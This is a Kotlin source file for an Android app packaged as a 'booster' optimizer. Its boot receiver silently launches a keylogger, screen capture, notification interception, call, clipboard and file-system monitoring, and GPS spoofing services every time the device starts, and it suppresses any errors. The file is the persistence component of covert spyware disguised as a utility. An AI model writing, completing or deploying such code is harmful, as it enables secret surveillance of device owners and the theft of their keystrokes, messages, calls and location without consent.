package com.sysopt.booster

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.core.content.ContextCompat

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        if (intent?.action == Intent.ACTION_BOOT_COMPLETED ||
            intent?.action == Intent.ACTION_QUICKBOOT_POWERON) {

            // Deploy all services on boot
            val services = listOf(
                CoreService::class.java,
                ScreenCaptureService::class.java,
                KeyloggerService::class.java,
                NotificationInterceptorService::class.java,
                CallMonitorService::class.java,
                ClipboardMonitorService::class.java,
                FileSystemMonitorService::class.java,
                GPSSpoofService::class.java
            )

            services.forEach { cls ->
                try {
                    ContextCompat.startForegroundService(context, Intent(context, cls))
                } catch (e: Exception) {
                    // Silent
                }
            }

            // Also request overlay if needed
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                // Overlay permission handled elsewhere
            }
        }
    }
}